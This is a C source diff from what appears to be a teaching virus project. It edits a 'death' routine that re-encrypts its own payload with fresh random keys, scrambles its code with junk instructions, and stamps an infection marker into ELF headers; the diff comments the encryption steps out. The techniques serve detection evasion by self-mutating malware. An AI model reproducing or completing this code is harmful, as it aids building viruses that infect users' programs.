@@ -4,10 +4,10 @@
 //#include <unistd.h>
 
 #include "utils.h"
+#include "crypt.h"
 #include "death.h"
 #include "data.h"
 #include "famine.h"
-#include "crypt.h"
 #include "syscall.h"
 
 extern void __attribute__((naked)) _start(void);
@@ -346,38 +346,39 @@ static void write_self_pos(uint8_t *entry) {
 #define G_IS_ENCRYPTED_OFF (uintptr_t)&g_is_encrypted - (uintptr_t)&_start
 #define G_KEY_OFF (uintptr_t)&g_key - (uintptr_t)&_start
 
-static uint8_t* encrypt_self(uint8_t *entry) {
+//static uint8_t* encrypt_self(uint8_t *entry) {
+//
+//	/* encrypt self */
+//	uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
+//	getrandom(key, KEY_SIZE, 0);
+//
+//	encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
+//
+//	uint8_t *enc = (uint8_t *)(entry + G_IS_ENCRYPTED_OFF);
+//	*enc = true; JUNK;
+//
+//	return key;
+//}
 
-	/* encrypt self */
-	uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
-	getrandom(key, KEY_SIZE, 0);
-
-	encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
-
-	uint8_t *enc = (uint8_t *)(entry + G_IS_ENCRYPTED_OFF);
-	*enc = true; JUNK;
-
-	return key;
-}
-
-int death(saved_vars_t *vars, file_t *file) {
+int death(crypt_params_t *saved, int offset, file_t *file, bool is_encrypted) {
 
 	uint8_t *self = (uint8_t *)file->view.data; JUNK;
 	char *self_name = file->abs_path;
 	int fd = -1;
+	(void)saved;
 
-	uint8_t *entry = self + vars->start_offset;
+	uint8_t *entry = self + offset;
 
-	if (vars->is_encrypted) {
-		uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
-		getrandom(key, KEY_SIZE, 0);
-		decrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, vars->key);
-		replace_nop(entry, g_junk_offsets);
-		encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
+	if (is_encrypted == true) {
+		//uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
+		//getrandom(key, KEY_SIZE, 0);
+		//decrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, vars->key);
+		//replace_nop(entry, g_junk_offsets);
+		//encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
 	} else { // only for the first run of the main prog (like fill_offsets)
 		write_self_pos(entry);
 		replace_nop(entry, g_junk_offsets);
-		encrypt_self(entry);
+		//encrypt_self(entry);
 		*(uint32_t *)(Elf64_Ehdr *)(self + EI_PAD) = MAGIC_NUMBER; JUNK;
 	}
 
